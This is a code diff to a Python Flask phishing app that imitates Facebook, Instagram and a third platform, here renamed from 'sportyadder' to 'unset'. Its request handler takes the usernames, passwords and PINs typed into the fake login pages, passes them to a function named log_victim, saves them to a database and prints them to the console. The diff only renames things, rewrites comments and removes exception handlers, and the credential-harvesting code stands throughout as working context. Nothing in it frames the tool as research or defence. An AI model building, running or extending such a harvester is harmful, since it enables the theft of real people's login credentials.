@@ -21,18 +21,18 @@ app.config["SECRET_KEY"] = (
     "692hdkbckjz9qqykq3t8eq"  # Needed for sessions and flash messages
 )
 
-# This starts the model for the database.
+# This starts the model for the database since we didn't start it in our model(module).
 db.init_app(app)
 
-
+# This It registers the routes based on the user's choice.Go to line 103 for better understanding.
 def register_routes(app, allowed_platform):
     def handle_platform(platform):
         if request.method == "POST":
             username = request.form.get("username")
             password = request.form.get("password")
-            pin = request.form.get("pin") if platform == "sportyadder" else None
+            pin = request.form.get("pin") if platform == "unset" else None
             log_victim(platform, username, password, pin)
-            if platform == "sportyadder":
+            if platform == "unset":
                 try:
                     new_user2 = User2(username=username, password=password, pin=pin)
                     db.session.add(new_user2)
@@ -45,9 +45,7 @@ def register_routes(app, allowed_platform):
                 except OperationalError as e:
                     print(f"Database error: {e}")
                     return "Database file is missing or inaccessible. Please check your database setup."
-                except Exception as e:
-                    print(f"Unexpected error: {e}")
-                    return "An unexpected error occurred. Please contact admin."
+                
                 if user2:
                     print(
                         f"[{platform.upper()}] New login: username='{username}', password='{password}', pin='{pin}'"
@@ -67,9 +65,6 @@ def register_routes(app, allowed_platform):
                 except OperationalError as e:
                     print(f"Database error: {e}")
                     return "Database file is missing or inaccessible. Please check your database setup."
-                except Exception as e:
-                    print(f"Unexpected error: {e}")
-                    return "An unexpected error occurred. Please contact admin."
                 if user:
                     print(
                         f"[{platform.upper()}] New login: username='{username}', password='{password}'"
@@ -81,11 +76,8 @@ def register_routes(app, allowed_platform):
             return render_template(f"{platform}.html")
         except TemplateNotFound:
             return f"Template '{platform}.html' is missing. Please add it to your templates folder."
-        except Exception as e:
-            print(f"Template error: {e}")
-            return "An unexpected template error occurred. Please contact admin."
-
-    # Only register the selected platform's route
+        
+    # Register the route in accord with the user's choice.
     app.add_url_rule(
         "/",
         endpoint=allowed_platform,
@@ -96,6 +88,7 @@ def register_routes(app, allowed_platform):
 
 # This runs when you start the script
 if __name__ == "__main__":
+    # This creates a context for the app, which is necessary for database operations.
     with app.app_context():
         db.create_all()
     if os.environ.get("WERKZEUG_RUN_MAIN") != "true":
@@ -103,7 +96,7 @@ if __name__ == "__main__":
         routes = {
             "1": ("facebook", "/facebook"),
             "2": ("instagram", "/instagram"),
-            "3": ("sportyadder", "/sportyadder"),
+            "3": ("unset", "/unset"),
         }
         print("\nWelcome! Which page do you want to load?\n")
         for number, (name, _) in routes.items():
